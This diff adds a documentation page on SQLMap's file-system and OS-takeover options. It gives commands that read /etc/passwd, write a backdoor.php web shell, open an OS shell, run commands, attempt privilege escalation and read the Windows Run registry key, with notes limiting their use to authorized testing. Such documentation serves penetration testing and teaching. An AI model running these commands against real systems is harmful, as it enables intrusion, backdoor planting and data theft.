@@ -1,0 +1,96 @@
+---
+title: File System Access
+description: Learn how to access the file system through SQL injection vulnerabilities using SQLMap
+---
+
+# File System Access
+
+SQLMap can leverage SQL injection vulnerabilities to interact with the underlying file system of the database server. This capability varies depending on the database management system (DBMS) and the privileges of the database user.
+
+## Reading Files (`--file-read`)
+
+To read files from the database server's file system:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --file-read="/etc/passwd"
+```
+
+This attempts to read the specified file from the server's file system. The file content will be stored in the SQLMap output directory.
+
+<Note title="Database Support">
+File system access capabilities vary by DBMS:
+- MySQL: Requires FILE privilege
+- PostgreSQL: Limited to files in the database directory
+- Microsoft SQL Server: Requires appropriate permissions
+- Oracle: Requires specific privileges
+</Note>
+
+## Writing Files (`--file-write` and `--file-dest`)
+
+To write files to the database server's file system:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --file-write="local_file.php" --file-dest="/var/www/html/backdoor.php"
+```
+
+This command:
+1. Takes a local file (`local_file.php`)
+2. Uploads it to the target server
+3. Saves it at the specified destination path (`/var/www/html/backdoor.php`)
+
+<Note title="Warning">
+Writing files to a server without proper authorization is illegal in most jurisdictions. This functionality should only be used in authorized penetration testing scenarios.
+</Note>
+
+## OS Shell Access (`--os-shell`)
+
+SQLMap can attempt to gain operating system shell access:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --os-shell
+```
+
+This tries to leverage the SQL injection vulnerability to spawn a shell on the target system. SQLMap will attempt various techniques based on the DBMS:
+
+- For MySQL: Uses `INTO OUTFILE` to write a web shell
+- For Microsoft SQL Server: Uses `xp_cmdshell`
+- For PostgreSQL: Uses `COPY TO/FROM` or UDF injection
+- For Oracle: Uses Java or external table features
+
+## OS Command Execution (`--os-cmd`)
+
+To execute a single operating system command:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --os-cmd="id"
+```
+
+This executes the specified command on the target system and returns the output.
+
+## Privilege Escalation
+
+Some database systems allow for privilege escalation:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --privileges --is-dba
+```
+
+This checks if the current database user has administrative privileges. If not, SQLMap can sometimes attempt privilege escalation:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --priv-esc
+```
+
+## Registry Access (Windows)
+
+On Windows systems, SQLMap can access the registry:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --reg-read --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+```
+
+This reads the specified registry key from a Windows target system.
+
+<Note title="Ethical Considerations">
+File system access capabilities should only be used in authorized security testing scenarios. Unauthorized access to systems is illegal and unethical.
+</Note>
